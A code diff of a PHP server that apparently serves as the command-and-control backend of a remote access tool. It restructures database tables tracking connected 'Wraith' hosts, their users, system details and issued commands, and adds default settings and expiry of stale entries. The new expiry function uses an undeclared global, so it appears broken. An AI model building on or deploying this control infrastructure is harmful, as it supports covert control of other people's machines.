@@ -23,38 +23,19 @@ try {
     $db_init_commands = [
         // Settings table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_Settings` (
-            `WraithMarkOfflineDelaySeconds` TEXT,
-            `WraithInitialCryptKey` TEXT,
-            `WraithSwitchCryptKey` TEXT,
-            `APIFingerprint` TEXT,
-            `DefaultCommand` TEXT,
-            `APIPrefix` TEXT,
-            `RequestIPBlacklist` TEXT,
-            `NoEncrypt` TEXT
+            `Key` TEXT,
+            `Value` TEXT
         );",
         // Statistics table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_Stats` (
-            `DatabaseSetupTime` TEXT,
-            `LifetimeWraithConnections` TEXT,
-            `CurrentActiveWraiths` TEXT,
-            `MostRecentWraithLogin` TEXT,
-            `WraithUploads` TEXT,
-            `CommandsIssued` TEXT,
-            `CommandsExecuted` TEXT
+            `Key` TEXT,
+            `Value` TEXT
         );",
         // Connected Wraiths table
         "CREATE TABLE IF NOT EXISTS `WraithAPI_ActiveWraiths` (
             `AssignedID` TEXT,
-            `Fingerprint` TEXT,
-            `ReportedIP` TEXT,
-            `ConnectingIP` TEXT,
-            `OSType` TEXT,
-            `SystemName` TEXT,
-            `HostUserName` TEXT,
-            `WraithVersion` TEXT,
-            `WraithStartTime` TEXT,
-            `ActivePlugins` TEXT,
-            `ConnectionTime` TEXT,
+            `HostProperties` TEXT,
+            `WraithProperties` TEXT,
             `LastHeartbeatTime` TEXT,
             `IssuedCommands` TEXT
         );",
@@ -74,17 +55,50 @@ try {
             `UserPassword` TEXT,
             `UserPrivileges` TEXT
         );",
-        // Initialisation marker
-        "CREATE TABLE IF NOT EXISTS `DB_INIT_INDICATOR` (
-            `DB_INIT_INDICATOR` INTEGER
+        // Create default settings entries
+        "INSERT INTO `WraithAPI_Settings` VALUES (
+            'MarkOfflineDelay',
+            '16'
+        );",
+        "INSERT INTO `WraithAPI_Settings` VALUES (
+            'WraithInitialCryptKey',
+            'QWERTYUIOPASDFGHJKLZXCVBNM'
+        );",
+        "INSERT INTO `WraithAPI_Settings` VALUES (
+            'WraithSwitchCryptKey',
+            'QWERTYUIOPASDFGHJKLZXCVBNM'
+        );",
+        "INSERT INTO `WraithAPI_Settings` VALUES (
+            'APIFingerprint',
+            'ABCDEFGHIJKLMNOP'
+        );",
+        "INSERT INTO `WraithAPI_Settings` VALUES (
+            'DefaultCommand',
+            ''
+        );",
+        "INSERT INTO `WraithAPI_Settings` VALUES (
+            'APIPrefix',
+            'W_'
+        );",
+        "INSERT INTO `WraithAPI_Settings` VALUES (
+            'RequestIPBlacklist',
+            '[]'
         );",
         // Create a stats table entry
-        "INSERT INTO `WraithAPI_Stats` (
-            `DatabaseSetupTime`
-        ) VALUES (
+        "INSERT INTO `WraithAPI_Stats` VALUES (
+            'DatabaseSetupAPIVersion',
+            '" . API_VERSION . "'
+        );",
+        // Create a stats table entry
+        "INSERT INTO `WraithAPI_Stats` VALUES (
+            'DatabaseSetupTime',
             '" . time() . "'
+        );",
+        // Mark the database as initialised
+        "CREATE TABLE IF NOT EXISTS `DB_INIT_INDICATOR` (
+            `DB_INIT_INDICATOR` INTEGER
         );"
-    ];
+    ]; // TODO: Set default of NoCrypt to 0
 
     // Execute the SQL queries to initialise the database
     foreach ($db_init_commands as $command) {
@@ -95,37 +109,12 @@ try {
 
 }
 
-// Check whether a settings entry exists
-try {
-
-    // Get the first row of the settings table
-    $SETTINGS = $db->query("SELECT * FROM WraithAPI_Settings LIMIT 1")->fetchAll();
-
-    // The row is returned within another array by fetchAll(). If the length of
-    // that array is 0, there are no rows so raise an exception to create one
-    if (sizeof($SETTINGS) == 0) { throw new Exception(""); }
-
-} catch (Exception $e) {
-
-    // Create default settings entry if not
-
-    $settings_entry_creation_command = "INSERT INTO `WraithAPI_Settings` VALUES (
-        '20',
-        'QWERTYUIOPASDFGHJKLZXCVBNM',
-        'QWERTYUIOPASDFGHJKLZXCVBNM_switch',
-        'ABCDEFGHIJKLMNOP',
-        '',
-        'W_',
-        '[]',
-        '1'
-    );"; // TODO: Change NoEncrypt default to 0 for release
-
-    $db->exec($settings_entry_creation_command);
-
+// Set the global SETTINGS variable with the settings from the database
+$settings_table = $db->query("SELECT * FROM WraithAPI_Settings");
+$SETTINGS = [];
+foreach ($settings_table as $table_row) {
+    $SETTINGS[$table_row[0]] = $table_row[1];
 }
-
-// Set the global SETTINGS variable
-$SETTINGS = $db->query("SELECT * FROM WraithAPI_Settings LIMIT 1")->fetchAll()[0];
 
 // Check whether a user account exists
 // There has to be a way to manage the API so if there are no users,
@@ -170,47 +159,24 @@ function db_add_wraiths($data) {
 
     $statement = $db->prepare("INSERT INTO `WraithAPI_ActiveWraiths` (
         `AssignedID`,
-        `Fingerprint`,
-        `ReportedIP`,
-        `ConnectingIP`,
-        `OSType`,
-        `SystemName`,
-        `HostUserName`,
-        `WraithVersion`,
-        `WraithStartTime`,
-        `ActivePlugins`,
-        `ConnectionTime`,
+        `HostProperties`,
+        `WraithProperties`,
         `LastHeartbeatTime`,
         `IssuedCommands`
     ) VALUES (
         :AssignedID,
-        :Fingerprint,
-        :ReportedIP,
-        :ConnectingIP,
-        :OSType,
-        :SystemName,
-        :HostUserName,
-        :WraithVersion,
-        :WraithStartTime,
-        :ActivePlugins,
-        :ConnectionTime,
+        :HostProperties,
+        :WraithProperties,
         :LastHeartbeatTime,
         :IssuedCommands
     )");
 
     foreach ($data as $wraith) {
 
+        // Bind the parameters in the query with variables
         $statement->bindParam(":AssignedID", $wraith["AssignedID"]);
-        $statement->bindParam(":Fingerprint", $wraith["Fingerprint"]);
-        $statement->bindParam(":ReportedIP", $wraith["ReportedIP"]);
-        $statement->bindParam(":ConnectingIP", $wraith["ConnectingIP"]);
-        $statement->bindParam(":OSType", $wraith["OSType"]);
-        $statement->bindParam(":SystemName", $wraith["SystemName"]);
-        $statement->bindParam(":HostUserName", $wraith["HostUserName"]);
-        $statement->bindParam(":WraithVersion", $wraith["WraithVersion"]);
-        $statement->bindParam(":WraithStartTime", $wraith["WraithStartTime"]);
-        $statement->bindParam(":ActivePlugins", $wraith["ActivePlugins"]);
-        $statement->bindParam(":ConnectionTime", $wraith["ConnectionTime"]);
+        $statement->bindParam(":HostProperties", $wraith["HostProperties"]);
+        $statement->bindParam(":WraithProperties", $wraith["WraithProperties"]);
         $statement->bindParam(":LastHeartbeatTime", $wraith["LastHeartbeatTime"]);
         $statement->bindParam(":IssuedCommands", $wraith["IssuedCommands"]);
 
@@ -236,7 +202,13 @@ function db_expire_wraiths() {
 
     global $db;
 
-    // TODO
+    // Remove all Wraith entries where the last heartbeat time is older than
+    // the $SETTINGS["MarkOfflineDelay"]
+    $statement = $db->prepare("DELETE FROM `WraithAPI_ActiveWraiths`
+        WHERE `LastHeartbeatTime` < :earliest_valid_heartbeat");
+    $earliest_valid_heartbeat = time()-$SETTINGS["MarkOfflineDelay"];
+    $statement->bindParam(":earliest_valid_heartbeat", $earliest_valid_heartbeat);
+    $statement->execute();
 
 }
 
